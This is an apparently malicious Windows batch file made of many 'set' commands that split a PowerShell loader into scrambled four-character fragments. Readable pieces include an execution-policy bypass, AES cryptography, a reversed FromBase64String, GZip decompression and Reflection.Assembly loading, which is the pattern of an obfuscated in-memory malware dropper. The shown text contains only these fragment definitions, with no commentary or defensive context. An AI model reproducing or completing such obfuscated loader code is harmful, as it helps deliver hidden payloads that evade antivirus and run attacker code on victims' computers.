@echo off
set "RzSaNthffk=rtS4"
set "YclnsIYxvB=]::("
set "vaNdnssmZi=JpH."
set "XjXimvCzUZ= if "
set "mieCyISJxy=bstr"
set "UuwSAbRpIY=)($s"
set "pJNPDZtLfo=.Mem"
set "WgpsRsEkXL=bypa"
set "MDPQwehGAZ=[IO."
set "HJaDTBOmeK='[-1"
set "XpstdCfoBs=, $x"
set "JbtRJATfpb= [Sy"
set "VyFreLEDvD=:: '"
set "bZJwuLjzhn=le  "
set "uWWAUEkFMo=; };"
set "TNmtetWxJu=X = "
set "zwohjgMSsH=;$Fe"
set "cnKNuJQPyI=.Dis"
set "hsxjvubjte=1..-"
set "nnrrcJLqLg=hy.A"
set "xzVidSxuiC==');"
set "mSoFdRBKKq=mwiL"
set "vwJYjlVKzy=L = "
set "rSwpySChVq='[-1"
set "DCeHmVuMQF=R.En"
set "FtDmxrgukY=vj0m"
set "dOVfhtpsTi=YJpH"
set "QBGhgINvCD=.Len"
set "qWuWclKwtz=O.Me"
set "bLJBvMHxhn=::('"
set "xZCUkpJlQy=join"
set "sYDTZOMVuX=ke($"
set "YidDCRsgaw=am;$"
set "MzJuipZsqY=rity"
set "SbMuFKGNuC=($eZ"
set "GasWEBSdNQ=;$cY"
set "uPDlJPmAin=rity"
set "gxWzUNIgTV=Secu"
set "AnFcwbZJku=xmwi"
set "QBfONSOMia=pDZz"
set "EbukQSALTb=pres"
set "IbpUAaIbDB=.Mod"
set "ASpnZkBNvG=6esa"
set "YJVvRvqBSL='txe"
set "pdHsaBPGji=ateD"
set "yHEkCeuaYr=th('"
set "zpePZFHfeW=7Yiv"
set "QYQpRXaXKs=$FeC"
set "uPTwhXsMOy=form"
set "YjXHNZHiQp=Syst"
set "QjFmdVTbon== [S"
set "PKMXYHEuti=Disp"
set "sqyXGSmNlm=iron"
set "PFhaYYePQd=.GZi"
set "AtYrAuLgda=oin "
set "qKCZEtjnmr=$obW"
set "CBcdwVrdaw=$WIl"
set "dRFvsGyYtS= = $"
set "TUrcAhoWLG=t Sy"
set "cxpIEZdFZU=em.I"
set "dGScJzfhry=Disp"
set "fMoeohtRoM=.Key"
set "AZRitlxedG=.Ass"
set "MgXNXTMhzg=embl"
set "VNcYVjJZIJ=WO ="
set "YUzUPSllWH=L = "
set "UGRojQjJNy=);$Q"
set "EmzwSIUime=saBm"
set "ddyAXycEvi=bjec"
set "WicFvCftSc=xmwi"
set "zHpjSDVJMz=ddin"
set "xNnQSdKfXA=.Cre"
set "ygHByzfFMk=Comp"
set "uitZbUJqEb=and "
set "ereuxwxUey= [st"
set "EFLAjxiMeB=m.Re"
set "PFuTNRXhfe=ress"
set "RAwjEGgveS=.IO."
set "JdMxszkCjL=bWjU"
set "tTKBScYubl=]::C"
set "rLyxvtYhMN=ress"
set "ktJiVFJump=.Con"
set "EjfDIUCwjX=oint"
set "JpiwIqojAs=Kff "
set "khCKMBtPKv=esMa"
set "VabEqHaHKo=oryS"
set "tLxBzYzXip=eam("
set "igBprgdIve=esaB"
set "oAXJCuyLSW=se()"
set "zBTmkzMRAT=pStr"
set "bmPrTdCmuP=v4Ir"
set "vzcEbRoCXH=oArr"
set "FcltCDRxPw=ew-O"
set "BtjgHUQqsE=6] -"
set "TSgLRvIlmv=CHc."
set "gGTrDPkHFC=GxqI"
set "aAAWxmzcQY=($eZ"
set "FxScmaOFmO=ring"
set "WYmrWFOogs=tem."
set "ajZNgkoXfA=[Env"
set "AhbrLUwrCy=m.IO"
set "VpjHXdYrRr=i = "
set "xlYmsAcScI=m.IO"
set "pKRoAeRCtb=flec"
set "hUrbxtLIDH=] -j"
set "admjzuIxrw=-joi"
set "LTPdTeqrYC=V = "
set "QnvTFMpigc=lit("
set "ucoPdrPRnR=QMi."
set "PfRYzOGTMe=tryP"
set "ONzVBOofAY=$QmI"
set "lcScZoHagr=bWjU"
set "xFjbhNOIrA=oR.T"
set "iXHuLPRFzC=$WIl"
set "nKmzruqwfz=ose("
set "DlAcuNFDEk=sGUc"
set "FsEIeIQHZc=ress"
set "TVgsBQcZcR=onve"
set "efXmvTMihc=1] -"
set "hhlGntmiHp=y]::"
set "zxnsirXJcB=+hAO"
set "nzGytlRzYx=ionM"
set "hgarcWDPXp=Bmor"
set "XfFslxktVL=$xmw"
set "QcmvvxFjtu=.Dis"
set "YlxSzzuqKQ=sion"
set "exQfFJCvuD=WxcW"
set "vYEmWRVQEj=tem."
set "OEPpWKyAXQ=16] "
set "yYFwzLEdRj=e]::"
set "FOZZapSIUp=('da"
set "ABeqkVolif=.Cry"
set "nWZtlFtGoY=y.Ci"
set "ymUgOAJFQU=CHc "
set "gYCwlxqWvq=$Wxc"
set "ODtPVhUwgm=GwQM"
set "atLNBujnYx=pose"
set "fgtzDcOdxS=ect "
set "BpwbuMyxDj=, (,"
set "cdTdhrHvTi=comp"
set "PxsSjbGJaw=morF"
set "iKUGXtOlVa=-1.."
set "ZcRUSMwevS=lX.D"
set "HNmVncRapR=grap"
set "EyzTzYzBJP=.Sec"
set "xdHxFCxRIc=trea"
set "FejOhAPxnM=ewLi"
set "ADWwvlGhZx=orF'"
set "RnTmtHetrc=Comp"
set "OMdcIyGgBY=Syst"
set "LrTyUsNOGf=);$c"
set "cMmtEUTtpe=..-1"
set "hwzyzCsriG=isfL"
set "qfHkxzxhGL=tem."
set "PsiQESnKFu=-joi"
set "AlbYgwpydG=:('g"
set "oKpgCYwkMs=stem"
set "PGfbEUcppA=).Sp"
set "ffWMoPoiRV=daeR"
set "cTPPLnAhXn=[Sys"
set "OwdbCUSKGT=ct S"
set "bYcHnvQoyJ= = N"
set "EVMebKqNNa= '')"
set "SjtaevcBVp=-Obj"
set "cToMdIDuGI=ss -"
set "vHcmtFviww=Secu"
set "LjHWSUfvqS=[Sys"
set "AzIBoIxjqR=GxqI"
set "DScniiTnvl='')("
set "sdVWCxTUNs= New"
